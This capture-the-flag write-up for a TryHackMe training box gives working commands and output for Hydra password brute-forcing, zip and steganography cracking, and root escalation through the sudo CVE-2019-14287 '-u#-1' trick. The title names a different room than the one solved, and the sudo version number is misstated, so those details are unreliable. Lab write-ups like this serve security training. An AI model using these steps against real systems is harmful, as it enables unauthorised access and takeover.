# [Bounty Hacker CTF] - Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Date Completed:** [15.10.2025]  
**Skills Used:** [Password cracking, Steganography]  
**Tools Used:** [Hydra, John the ripper, steghide]

## Executive Summary

This box required me to enumerate open ports, manipulate HTTP headers to discover hidden pages, and crack FTP credentials using Hydra. After logging into FTP, I found password-protected images containing steganographic data, which I extracted using steghide and John the Ripper. The recovered credentials allowed me SSH access as user james. Finally, I exploited CVE-2019-14287 in sudo version 1.18.21p2 to escalate privileges to root by executing commands with user ID -1.

## Initial Reconnaissance

### Port Scanning

As usual I started by scanning the target machine for open ports :

```bash
sudo nmap -sS -sV 10.10.24.78
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-15 22:46 CEST
Nmap scan report for 10.10.24.78
Host is up (0.034s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
```

**Results:**

- Port 21: FTP
- Port 22: SSH
- Port 80: HTTP

How many open ports ? 3

## Vulnerability Analysis

When visiting the website, the main page shows :

```html
Dear agents, Use your own codename as user-agent to access the site. From, Agent
R
```

I tried to put different alphabet letters as the user-agent (using OWASP ZAP to replicate requests). And with agent C :

```html
Attention chris, <br /><br />

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also,
change your god damn password, is weak! <br /><br />

From,<br />
Agent R
```

But then I do not get any special response when changing my user-agent to J.

How do you redirect yourself to a secret page? user-agent

What is the agent name? chris

I then attempted to find chris' ftp password, using rockyou.txt as a wordlist :

```bash
hydra -l chris -P /home/armould/rockyou.txt ftp://10.10.24.78
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-15 23:12:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344390 login tries (l:1/p:14344390), ~896525 tries per task
[DATA] attacking ftp://10.10.24.78:21/

[21][ftp] host: 10.10.24.78   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-15 23:13:06
```

FTP password : crystal

After logging into ftp using chris' credentials, I found some "alien images" files, as well as a new text file :

```text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

This sounds like steganography ! In one of the 2 alien images, I see that there is a hidden zip file (binwalk automatically extracts it for me) :

```bash
 binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

But I cannot unzip it as it is password protected. I thus try to crack it using John the ripper and the rockyou wordlist :

```bash
zip2john 8702.zip > zip_hash

/home/armould/john/run/john zip_hash --wordlist=/home/armould/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size [KiB]) is 1 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2025-10-16 18:23) 3.704g/s 151703p/s 151703c/s 151703C/s 123456..loser69
```

Zip file password : alien

This password lets me access yet another secret text file :

```bash
cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

After searching for a little bit, I discovered that this is the base64 encoding for 'Area51'.

steg password : Area51

It is now time to go back to the second alien image that seemed to not have any hidden content : It seems like the file was simply password protected.
And indeed :

```bash
steghide extract -sf cute-alien.jpg
Entrez la passphrase:
Écriture des données extraites dans "message.txt".

cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

I obtained J's actual name (hoping that it is also his login) and his password. I can now connect to the target via ssh with his credentials.

Who is the other agent (in full name)? james
SSH password : hackerrules!
What is the user flag? [USERFLAG]

There is also an image in james' directory, and after a little reverse search :
What is the incident of the photo called? Roswell alien autopsy

## Privilege Escalation

After some research, I realised that the sudo version(1.18.21p2) has a vulnerability that can lead to privilege escalation :

CVE number for the escalation : CVE-2019-14287
This exploit works as following : If a user is allowed to run commands as any user EXCEPT root (ALL, !root), they can still execute commands as root by specifying user ID -1.

```bash
sudo -n -u#-1 /bin/bash
root@agent-sudo:~#
```

And I am in !

```bash
cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
[ROOTFLAG]

By,
DesKel a.k.a Agent R

```
